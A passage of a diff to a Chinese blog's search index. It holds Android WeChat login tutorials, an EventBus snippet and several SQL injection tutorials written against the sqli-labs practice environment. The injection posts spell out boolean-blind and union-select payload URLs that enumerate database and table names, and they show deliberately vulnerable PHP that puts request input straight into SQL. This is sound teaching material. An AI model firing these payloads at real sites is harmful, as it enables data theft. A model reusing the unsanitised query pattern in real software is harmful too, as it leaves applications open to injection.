-&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
-</code></pre><p>[4]在AndroidManifest.xml中添加activity注册.   </p>
-<pre><code>&lt;activity android:name=&quot;.wxapi.WXEntryActivity&quot;
-    android:label=&quot;@string/app_name&quot;
-    android:exported=&quot;true&quot;
-    android:launchMode=&quot;singleTop&quot;
-    &gt;
-&lt;/activity&gt;
-</code></pre><p>[5]在WXEntryActivity中继承Activity并实现IWXAPIEventHandler接口.   </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-4a894506b8235e85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="实现IWXAPIEventHandler接口"><br>重写onCreate方法<br>在onCreate中需要重新注册一下微信<br>要不微信不执行回掉<br><img src="http://upload-images.jianshu.io/upload_images/2590671-bb5ff100cf328000.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="重写onCreate方法"></p>
-<p>实现onReq和onResp方法<br><a href="http://www.jianshu.com/p/c92e1134448d" target="_blank" rel="noopener">使用okhttp获取微信的openid和用户信息</a></p>
-<p>在onResp中可以获取code<br> 通过code参数加上AppID和AppSecret等，通过API换取access_token；<br> 通过access_token进行接口调用，获取用户基本数据资源或帮助用户实现基本操作。<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419317851&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">详情请参照</a></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-8052581cdb699373.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="onReq和onResp方法">  </p>
-]]></content>
+<p>注册和取消注册订阅者</p>
+<pre><code> @Override
+ public void onStart() {
+     super.onStart();
+     EventBus.getDefault().register(this);
+ }
+
+ @Override
+ public void onStop() {
+     super.onStop();
+     EventBus.getDefault().unregister(this);
+ }
+</code></pre><p>3.发送事件</p>
+<pre><code>`EventBus.getDefault().post(new MessageEvent());`
+</code></pre>]]></content>
       <categories>
         <category>android</category>
       </categories>
       <tags>
         <tag>android</tag>
-        <tag>weixin</tag>
+        <tag>eventbus</tag>
       </tags>
   </entry>
   <entry>
@@ -11150,6 +10932,224 @@ protected void initData() {
       </tags>
   </entry>
   <entry>
+    <title>android微信第三方登录1</title>
+    <url>/post/2304481464.html</url>
+    <content><![CDATA[<p><a href="https://github.com/shaomiao/AndroidWechatTest" target="_blank" rel="noopener">github测试地址</a><br><a href="https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=11_1" target="_blank" rel="noopener">微信SDK下载地址</a><br><a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">微信开放平台</a><br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=1417751808&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">微信api</a>  </p>
+<h2 id="开始接入微信登录"><a href="#开始接入微信登录" class="headerlink" title="开始接入微信登录"></a>开始接入微信登录</h2><p>1.申请你的AppID<br>注意：  </p>
+<h5 id="包名正确（重要）"><a href="#包名正确（重要）" class="headerlink" title="包名正确（重要）"></a>包名正确（重要）</h5><h5 id="签名正确（重要）"><a href="#签名正确（重要）" class="headerlink" title="签名正确（重要）"></a>签名正确（重要）</h5><p>微信提供的签名生成工具<br>把包名添加上去就可以获取签名<br>注意：把要获取签名的应用安装在手机上<br><a href="https://res.wx.qq.com/open/zh_CN/htmledition/res/dev/download/sdk/Gen_Signature_Android2.apk" target="_blank" rel="noopener">获取签名应用</a>  </p>
+<p>2.下载开发工具包<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN" target="_blank" rel="noopener">https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN</a>  </p>
+<p>3.在项目中引入开发包<br><img src="http://upload-images.jianshu.io/upload_images/2590671-b6783667e961b04b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在项目中引入开发工具包">  </p>
+<p>4.使用开发工具包<br>下面代码都是在MainActivity中<br>[1]注册微信  </p>
+<pre><code>
+private static final String APP_ID="你的appid";
+private IWXAPI api;
+private void regToWx(){
+    api= WXAPIFactory.createWXAPI(this,APP_ID,true);
+    api.registerApp(APP_ID);
+}
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+      super.onCreate(savedInstanceState);
+      setContentView(R.layout.activity_main);
+      //注册微信
+      regToWx();
+}
+</code></pre>
+
+
+
+
+<p>[2]登录微信</p>
+<pre><code>@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+    //注册微信
+    regToWx();
+    findViewById(R.id.wechat_login).setOnClickListener(new View.OnClickListener() {
+        @Override
+        public void onClick(View v) {
+            //登录微信
+            final SendAuth.Req req = new SendAuth.Req();
+            req.scope = &quot;snsapi_userinfo&quot;;
+            req.state = &quot;wechat_sdk_demo_test&quot;;
+            api.sendReq(req);
+        }
+    });
+}
+</code></pre><p>5.下面是最重要的一步。。。。<br>[1]建包<br>注意：要在你的包名下新建 wxapi 包<br>你的包名.wxapi  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-972bd98cefcbe360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="你的包名.wxapi"></p>
+<p>[2]建立与微信通讯的activity<br>在wxapi下新建activity<br>WXEntryActivity<br>[3]在AndroidManifest.xml中添加权限.   </p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
+</code></pre><p>[4]在AndroidManifest.xml中添加activity注册.   </p>
+<pre><code>&lt;activity android:name=&quot;.wxapi.WXEntryActivity&quot;
+    android:label=&quot;@string/app_name&quot;
+    android:exported=&quot;true&quot;
+    android:launchMode=&quot;singleTop&quot;
+    &gt;
+&lt;/activity&gt;
+</code></pre><p>[5]在WXEntryActivity中继承Activity并实现IWXAPIEventHandler接口.   </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-4a894506b8235e85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="实现IWXAPIEventHandler接口"><br>重写onCreate方法<br>在onCreate中需要重新注册一下微信<br>要不微信不执行回掉<br><img src="http://upload-images.jianshu.io/upload_images/2590671-bb5ff100cf328000.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="重写onCreate方法"></p>
+<p>实现onReq和onResp方法<br><a href="http://www.jianshu.com/p/c92e1134448d" target="_blank" rel="noopener">使用okhttp获取微信的openid和用户信息</a></p>
+<p>在onResp中可以获取code<br> 通过code参数加上AppID和AppSecret等，通过API换取access_token；<br> 通过access_token进行接口调用，获取用户基本数据资源或帮助用户实现基本操作。<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419317851&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">详情请参照</a></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-8052581cdb699373.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="onReq和onResp方法">  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+        <tag>weixin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android微信第三方登录2</title>
+    <url>/post/273860866.html</url>
+    <content><![CDATA[<p>利用http与微信通信换取用户信息和openid<br>使用了okhttp作为http通信的框架  </p>
+<hr>
+<ol>
+<li><p>首先实例化okhttp连接  </p>
+<p> <code>private final OkHttpClient client = new OkHttpClient();</code></p>
+</li>
+</ol>
+<h6 id="获得code"><a href="#获得code" class="headerlink" title="获得code"></a>获得code</h6><pre><code>case BaseResp.ErrCode.ERR_OK:
+//      可用以下两种方法获得code
+//      resp.toBundle(bundle);
+//      Resp sp = new Resp(bundle);
+//      String code = sp.code;
+//      或者
+String code = ((SendAuth.Resp) baseResp).code;
+String state = ((SendAuth.Resp) baseResp).state;
+Toast.makeText(getApplicationContext(), &quot;恭喜这是你的code&quot; + code, Toast.LENGTH_LONG).show();
+Log.e(TAG, &quot;onResp: &quot; + code);
+try {
+    getAccess_token(code);
+} catch (Exception e) {
+    e.printStackTrace();
+}
+//上面的code就是接入指南里要拿到的code
+break;
+</code></pre><hr>
+<h6 id="根据code获取用户信息"><a href="#根据code获取用户信息" class="headerlink" title="根据code获取用户信息"></a>根据code获取用户信息</h6><pre><code>private void getAccess_token(String code) throws Exception {
+    String url = &quot;https://api.weixin.qq.com/sns/oauth2/access_token?&quot; +
+            &quot;appid=&quot; + ConfigUtil.Wechat_Appid +
+            &quot;&amp;secret=&quot; + ConfigUtil.Wechat_AppSecret +
+            &quot;&amp;code=&quot; + code +
+            &quot;&amp;grant_type=authorization_code&quot;;
+    run(url);
+}
+</code></pre><hr>
+<h6 id="引入okhttp包"><a href="#引入okhttp包" class="headerlink" title="引入okhttp包"></a>引入okhttp包</h6><p><img src="http://upload-images.jianshu.io/upload_images/2590671-e535b2d91c6473b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="引入okhttp的包"></p>
+<pre><code>//通过http与微信通信
+public void run(String url) throws Exception {
+final Request request = new Request.Builder()
+        //.url(&quot;http://publicobject.com/helloworld.txt&quot;)
+        .url(url)
+        .get()
+        .build();
+
+client.newCall(request).enqueue(new Callback() {
+    @Override
+    public void onFailure(Call call, IOException e) {
+        e.printStackTrace();
+    }
+
+    @Override
+    public void onResponse(Call call, Response response) throws IOException {
+        if (!response.isSuccessful()) throw new IOException(&quot;Unexpected code &quot; + response);
+        try {
+            String responseStr=response.body().string();
+            JSONObject jsonObject = new JSONObject(responseStr);
+            System.out.println(TAG + jsonObject.getString(&quot;access_token&quot;));//在回调中获取access_token
+        } catch (JSONException e) {
+            e.printStackTrace();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+
+    }
+});
+}
+</code></pre><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>如果微信调不起来<br>仔细检查签名是否正确<br>如果修改过签名<br>可以重新安装下微信再试一下  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+        <tag>weixin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1.3.1-SQL注入-SQL盲注-布尔盲注</title>
+    <url>/post/2904355367.html</url>
+    <content><![CDATA[<h2 id="SQL盲注-布尔盲注"><a href="#SQL盲注-布尔盲注" class="headerlink" title="SQL盲注-布尔盲注"></a>SQL盲注-布尔盲注</h2><h3 id="01布尔盲注原理"><a href="#01布尔盲注原理" class="headerlink" title="01布尔盲注原理"></a>01布尔盲注原理</h3><pre><code>$id=$_GET[&#39;id&#39;];
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1 &quot;;
+$result=mysql_query($sql);
+$row=mysql_fetch_array($result);
+if($row)
+{
+    echo &quot;Right&quot;;
+}
+else
+{
+    echo &quot;Wrong&quot;;
+}
+</code></pre><p>代码存在SQL注入漏洞<br>然而页面即不会回显数据，也不会回显错误信息  </p>
+<p>只返回 “Right” 与 “Wrong”   </p>
+<p>这里我们可以通过构造语句，来判断数据库信息的正确性，再通过页面的“真”和“假”来识别我们的判断是否正确，这既是布尔盲注！  </p>
+<p>正确请求，id=1 -&gt; 返回 id=1的数据  </p>
+<p>错误请求，id=1’ -&gt; 返回 与正确页面不同的页面<br>1.如果页面返回“假”，说明系统执行的SQL语句为“假”如：id=1 and left((select version()),1)=5–+<br>2.想办法构造语句，判断数据库中内容的值<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/01.jpeg" alt=""></p>
+<h3 id="02布尔盲注方法"><a href="#02布尔盲注方法" class="headerlink" title="02布尔盲注方法"></a>02布尔盲注方法</h3><p>构造逻辑判断语句，判断信息的真假，取出所有的真值，实现SQL注入  </p>
+<pre><code>left() left(database(),1)&gt;&#39;s&#39;
+        database()显示数据库名称，left(a,b)从左侧截取a的前b位
+regexp select user() regexp &#39;^r&#39;
+        正则表达式的用法user()结果位root,regexp为匹配root的正则表达式
+like    select user() like &#39;ro%&#39;
+        与regexp类似，使用like进行匹配
+substr()  ascii(substr((select database()),1,1))=98
+ascii() substr(a,b,c)从b位置开始，截取字符串a到c长度，ascii()将某个字符转换为ascii值
+ord()    ord(mid((select user()),1,1))=114
+mid()    mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数痛ascii(),将字符串转为ascii值
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/02.jpeg" alt=""></p>
+<p><a href="http://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">MySql正则表达式</a></p>
+<p>注入点： </p>
+<pre><code>http://localhost:90/Less-8/?id=1&#39;
+http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;a&#39;--+
+http://localhost:90/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39;--+ 显示正确第一位为s
+
+http://localhost:90/Less-8/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;--+ 第一个表名称字符
+
+http://localhost:90/Less-8/?id=1&#39; and (select database() regexp &#39;^s&#39;)--+
+
+http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#39;^s&#39;)--+
+
+http://localhost:90/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like &#39;e%&#39;)--+
+
+http://localhost:90/Less-8/?id=1 and ascii((substr((select database()),1,1))=115--+
+
+http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from information_schema.tables where table_schema=database()),1,1))=115--+
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/ascii.jpg" alt=""></p>
+<h2 id="burp操作步骤"><a href="#burp操作步骤" class="headerlink" title="burp操作步骤"></a>burp操作步骤</h2><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/03.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/04.jpg" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/05.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/06.png" alt=""></p>
+<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/05/07.jpg" alt=""></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>sql盲注</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网络课程列表</title>
     <url>/post/378823961.html</url>
     <content><![CDATA[<p>edx：<br>edX是麻省理工和哈佛大学于2012年4月联手创建的大规模开放在线课堂平台。它免费给大众提供大学教育水平的在线课堂。两所大学在这个非盈利性计划各资助三千万美元。2012年秋天，edX在MITx启动。<br><a href="https://www.edx.org/course" target="_blank" rel="noopener">https://www.edx.org/course</a><br><a href="https://www.edx.org/edxchina" target="_blank" rel="noopener">https://www.edx.org/edxchina</a>  </p>
@@ -11335,6 +11335,142 @@ python --version
       </tags>
   </entry>
   <entry>
+    <title>1.1.1-SQL注入-SQL注入基础-Web应用框架分析</title>
+    <url>/post/2839062402.html</url>
+    <content><![CDATA[<h1 id="SQL注入漏洞原理与利用"><a href="#SQL注入漏洞原理与利用" class="headerlink" title="SQL注入漏洞原理与利用"></a>SQL注入漏洞原理与利用</h1><h2 id="Web应用框架分析"><a href="#Web应用框架分析" class="headerlink" title="Web应用框架分析"></a>Web应用框架分析</h2><h3 id="01-WEB框架"><a href="#01-WEB框架" class="headerlink" title="01 WEB框架"></a>01 WEB框架</h3><p>webapp-&gt;<br>    web前端<br>    web应用CMS／OA／Blog<br>    Web开发框架：Django／Struts2/ThinkPHP<br>    Web语言：PHP/JSP/.Net  </p>
+<hr>
+<p>容器-&gt;<br>    IIS、Apach、TomCat、Nginx</p>
+<h3 id="02-理解SQL注入"><a href="#02-理解SQL注入" class="headerlink" title="02 理解SQL注入"></a>02 理解SQL注入</h3><p>所有SQL语句 都有可能SQL注入  </p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1.1.1-SQL注入-SQL注入基础-SQL注入练习环境搭建</title>
+    <url>/post/2284174451.html</url>
+    <content><![CDATA[<h2 id="SQL注入练习环境搭建"><a href="#SQL注入练习环境搭建" class="headerlink" title="SQL注入练习环境搭建"></a>SQL注入练习环境搭建</h2><p>Sqli-labs<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a>  </p>
+<ul>
+<li>报错注入  </li>
+<li>盲注</li>
+<li>Update注入</li>
+<li>Insert注入</li>
+<li>Header注入</li>
+<li>二阶注入</li>
+<li>绕过WADF</li>
+</ul>
+<ol>
+<li>PHP+MySql+Apache<br>WAMP<br>windows  </li>
+</ol>
+<ul>
+<li>下载安装WAMP <a href="http://www.wampserver.com/en/" target="_blank" rel="noopener">http://www.wampserver.com/en/</a></li>
+<li>WAMP的www目录下 解压缩sqli-labs</li>
+<li>启动服务器</li>
+<li>配置数据库（root）phpMyadamin </li>
+<li>修改配置 sqli-labs/sql-connections/db-creds.inc</li>
+<li><a href="http://localhost/sqli-labs" target="_blank" rel="noopener">http://localhost/sqli-labs</a>  点击 setup/reset database for labs</li>
+</ul>
+<ol start="2">
+<li>Docker</li>
+</ol>
+<ul>
+<li>docker search sqli-labs</li>
+<li>docker pull acgplano/sqli-labs</li>
+<li>docker images</li>
+<li>docker run -dt --name sqli -p 80:80 --rm acgplano/sqli-labs  (-dt 后台运行 –name 命名 -p 端口名  80:80 本地：docker --rm 当停止后删除产生镜像)</li>
+</ul>
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>对应代码，边看代码边理解，学会一半，就基本没问题。  </p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1.1.1-SQL注入-SQL注入基础-SQL注入原理分析</title>
+    <url>/post/1730261069.html</url>
+    <content><![CDATA[<h2 id="SQL注入原理分析"><a href="#SQL注入原理分析" class="headerlink" title="SQL注入原理分析"></a>SQL注入原理分析</h2><h3 id="SQL注入背景介绍-SQL语言介绍"><a href="#SQL注入背景介绍-SQL语言介绍" class="headerlink" title="SQL注入背景介绍-SQL语言介绍"></a>SQL注入背景介绍-SQL语言介绍</h3><p>sql 结构化查询语言<br>通用的功能极强的关系数据库标准语言<br>功能包括查询、操纵、定义和控制四个方面<br>不需要告诉SQL如何访问数据库，只要告诉SQL需要数据库做什么 </p>
+<h3 id="SQL注入产生原因"><a href="#SQL注入产生原因" class="headerlink" title="SQL注入产生原因"></a>SQL注入产生原因</h3><p>网络技术与信息技术高速发展，B/S模式具有界面统一，使用简单，易于维护，扩展性好，共享度高等优点，B/S模式越来越多的被应用于程序编写中。  </p>
+<ol>
+<li>B/S建立在互联网，对安全控制能力较弱</li>
+<li>开发人员水平和经验参差不齐，没有在编写代码时对用户的输入数据或者页面携带信息进行必要的合法性判断。  </li>
+</ol>
+<p>攻击者利用这个机会<strong>提交一段数据库查询代码</strong>，根据程序返回的结果，就可以获得一些数据库信息。</p>
+<h3 id="SQL注入核心原理"><a href="#SQL注入核心原理" class="headerlink" title="SQL注入核心原理"></a>SQL注入核心原理</h3><p>SQL注入是一种将恶意的SQL代码<strong>插入或添加到应用（用户）的输入参数</strong>的攻击，攻击者探测出开发者编程过程中的漏洞，利用这些漏洞，巧妙的<strong>构造SQL语句</strong>对数据库系统的内容进行直接<strong>检索或修改</strong>。</p>
+<p>灵活的SQL查询语句+用户输入的数据带入了SQL语句=用户直接操作数据库-&gt;<strong>SQL注入漏洞</strong></p>
+<pre><code>select version();
+select id from where id=1;
+select id from jobs where id=1 union select version();
+
+select id.location from jobs where id=1 union select 1,version();  // 1是占位
+</code></pre><p>用户输入可控，代码对用户输入进行了拼接，带入SQL语句，产生SQL注入漏洞</p>
+<p><a href="http://test.com/index.php?id=1*UNION" target="_blank" rel="noopener">http://test.com/index.php?id=1*UNION</a> SELECT 1,version()#*</p>
+<pre><code>$id=$_GET[&#39;id&#39;];// id没做处理
+$sql=&quot;SELECT * FROM users WHEre id=&#39;$id&#39; LIMIT 0,1&quot;
+
+select id,location from jobs where id=1 union select 1,version()#
+</code></pre><p><br></p>
+<pre><code>docker ps --help
+docker ps -a
+docker exec -it &lt;id&gt; /bin/bash
+mysql
+show databases;
+use security;
+show tables;
+
+select * from users;
+select username from users where id=1;
+select username,password from users where id=1;
+
+select 1;
+select 1123;
+select version();
+select username,password from users where id=1 union select version();
+select username,password from users where id=1 union select 1,version();
+
+select * from users where id=1 limit 0,1;
+select * from users where id=-1 union select 1,2,version()# limit 0,1;
+
+// 浏览器
+http://127.0.0.1:90/Less-1/?id=1%27%20union%20select%201,2,3%23
+?id=1&#39; union select 1,2,3
+// %23 #
+
+http://127.0.0.1:90/Less-1/?id=-1%27%20union%20select%201,version(),3%23
+?id=-1&#39; union select 1,version(),3
+// 需要让它出个错
+
+// 控制台
+// 退出mysql
+exit
+
+cd /var/www/html/Less-1
+cat index.php
+vi index.php
+// 编辑
+echo $sql
+:wq
+</code></pre><p>todo sqli-labs源码地址</p>
+<pre><code>docker ps -a
+docker exec -it &lt;id&gt; /bin/bash
+cd /var/www/html/Less-1
+</code></pre>]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>1.1.1-SQL注入-SQL注入基础-Web应用框架分析-MySql注入方法逻辑运算及常用函数</title>
     <url>/post/1786754042.html</url>
     <content><![CDATA[<h2 id="MySql常用函数及逻辑运算"><a href="#MySql常用函数及逻辑运算" class="headerlink" title="MySql常用函数及逻辑运算"></a>MySql常用函数及逻辑运算</h2><h3 id="01-常用的函数"><a href="#01-常用的函数" class="headerlink" title="01 常用的函数"></a>01 常用的函数</h3><p>MySql内置函数：<br><a href="https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html</a>  </p>
@@ -11515,101 +11651,8 @@ http://127.0.0.1/Less-1/?id=1 and 1=2 union select 1,user(),3--+
         <category>web安全</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.1.1-SQL注入-SQL注入基础-Web应用框架分析</title>
-    <url>/post/2839062402.html</url>
-    <content><![CDATA[<h1 id="SQL注入漏洞原理与利用"><a href="#SQL注入漏洞原理与利用" class="headerlink" title="SQL注入漏洞原理与利用"></a>SQL注入漏洞原理与利用</h1><h2 id="Web应用框架分析"><a href="#Web应用框架分析" class="headerlink" title="Web应用框架分析"></a>Web应用框架分析</h2><h3 id="01-WEB框架"><a href="#01-WEB框架" class="headerlink" title="01 WEB框架"></a>01 WEB框架</h3><p>webapp-&gt;<br>    web前端<br>    web应用CMS／OA／Blog<br>    Web开发框架：Django／Struts2/ThinkPHP<br>    Web语言：PHP/JSP/.Net  </p>
-<hr>
-<p>容器-&gt;<br>    IIS、Apach、TomCat、Nginx</p>
-<h3 id="02-理解SQL注入"><a href="#02-理解SQL注入" class="headerlink" title="02 理解SQL注入"></a>02 理解SQL注入</h3><p>所有SQL语句 都有可能SQL注入  </p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
         <tag>web安全</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.1.1-SQL注入-SQL注入基础-SQL注入原理分析</title>
-    <url>/post/1730261069.html</url>
-    <content><![CDATA[<h2 id="SQL注入原理分析"><a href="#SQL注入原理分析" class="headerlink" title="SQL注入原理分析"></a>SQL注入原理分析</h2><h3 id="SQL注入背景介绍-SQL语言介绍"><a href="#SQL注入背景介绍-SQL语言介绍" class="headerlink" title="SQL注入背景介绍-SQL语言介绍"></a>SQL注入背景介绍-SQL语言介绍</h3><p>sql 结构化查询语言<br>通用的功能极强的关系数据库标准语言<br>功能包括查询、操纵、定义和控制四个方面<br>不需要告诉SQL如何访问数据库，只要告诉SQL需要数据库做什么 </p>
-<h3 id="SQL注入产生原因"><a href="#SQL注入产生原因" class="headerlink" title="SQL注入产生原因"></a>SQL注入产生原因</h3><p>网络技术与信息技术高速发展，B/S模式具有界面统一，使用简单，易于维护，扩展性好，共享度高等优点，B/S模式越来越多的被应用于程序编写中。  </p>
-<ol>
-<li>B/S建立在互联网，对安全控制能力较弱</li>
-<li>开发人员水平和经验参差不齐，没有在编写代码时对用户的输入数据或者页面携带信息进行必要的合法性判断。  </li>
-</ol>
-<p>攻击者利用这个机会<strong>提交一段数据库查询代码</strong>，根据程序返回的结果，就可以获得一些数据库信息。</p>
-<h3 id="SQL注入核心原理"><a href="#SQL注入核心原理" class="headerlink" title="SQL注入核心原理"></a>SQL注入核心原理</h3><p>SQL注入是一种将恶意的SQL代码<strong>插入或添加到应用（用户）的输入参数</strong>的攻击，攻击者探测出开发者编程过程中的漏洞，利用这些漏洞，巧妙的<strong>构造SQL语句</strong>对数据库系统的内容进行直接<strong>检索或修改</strong>。</p>
-<p>灵活的SQL查询语句+用户输入的数据带入了SQL语句=用户直接操作数据库-&gt;<strong>SQL注入漏洞</strong></p>
-<pre><code>select version();
-select id from where id=1;
-select id from jobs where id=1 union select version();
-
-select id.location from jobs where id=1 union select 1,version();  // 1是占位
-</code></pre><p>用户输入可控，代码对用户输入进行了拼接，带入SQL语句，产生SQL注入漏洞</p>
-<p><a href="http://test.com/index.php?id=1*UNION" target="_blank" rel="noopener">http://test.com/index.php?id=1*UNION</a> SELECT 1,version()#*</p>
-<pre><code>$id=$_GET[&#39;id&#39;];// id没做处理
-$sql=&quot;SELECT * FROM users WHEre id=&#39;$id&#39; LIMIT 0,1&quot;
-
-select id,location from jobs where id=1 union select 1,version()#
-</code></pre><p><br></p>
-<pre><code>docker ps --help
-docker ps -a
-docker exec -it &lt;id&gt; /bin/bash
-mysql
-show databases;
-use security;
-show tables;
-
-select * from users;
-select username from users where id=1;
-select username,password from users where id=1;
-
-select 1;
-select 1123;
-select version();
-select username,password from users where id=1 union select version();
-select username,password from users where id=1 union select 1,version();
-
-select * from users where id=1 limit 0,1;
-select * from users where id=-1 union select 1,2,version()# limit 0,1;
-
-// 浏览器
-http://127.0.0.1:90/Less-1/?id=1%27%20union%20select%201,2,3%23
-?id=1&#39; union select 1,2,3
-// %23 #
-
-http://127.0.0.1:90/Less-1/?id=-1%27%20union%20select%201,version(),3%23
-?id=-1&#39; union select 1,version(),3
-// 需要让它出个错
-
-// 控制台
-// 退出mysql
-exit
-
-cd /var/www/html/Less-1
-cat index.php
-vi index.php
-// 编辑
-echo $sql
-:wq
-</code></pre><p>todo sqli-labs源码地址</p>
-<pre><code>docker ps -a
-docker exec -it &lt;id&gt; /bin/bash
-cd /var/www/html/Less-1
-</code></pre>]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
-        <tag>sql注入</tag>
       </tags>
   </entry>
   <entry>
@@ -11667,8 +11710,8 @@ select [name] from system
         <category>web安全</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>sql注入</tag>
+        <tag>web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -11724,51 +11767,8 @@ http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select &#39;test&#39; into o
         <category>web安全</category>
       </categories>
       <tags>
-        <tag>web安全</tag>
         <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.1.1-SQL注入-SQL注入基础-SQL注入练习环境搭建</title>
-    <url>/post/2284174451.html</url>
-    <content><![CDATA[<h2 id="SQL注入练习环境搭建"><a href="#SQL注入练习环境搭建" class="headerlink" title="SQL注入练习环境搭建"></a>SQL注入练习环境搭建</h2><p>Sqli-labs<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a>  </p>
-<ul>
-<li>报错注入  </li>
-<li>盲注</li>
-<li>Update注入</li>
-<li>Insert注入</li>
-<li>Header注入</li>
-<li>二阶注入</li>
-<li>绕过WADF</li>
-</ul>
-<ol>
-<li>PHP+MySql+Apache<br>WAMP<br>windows  </li>
-</ol>
-<ul>
-<li>下载安装WAMP <a href="http://www.wampserver.com/en/" target="_blank" rel="noopener">http://www.wampserver.com/en/</a></li>
-<li>WAMP的www目录下 解压缩sqli-labs</li>
-<li>启动服务器</li>
-<li>配置数据库（root）phpMyadamin </li>
-<li>修改配置 sqli-labs/sql-connections/db-creds.inc</li>
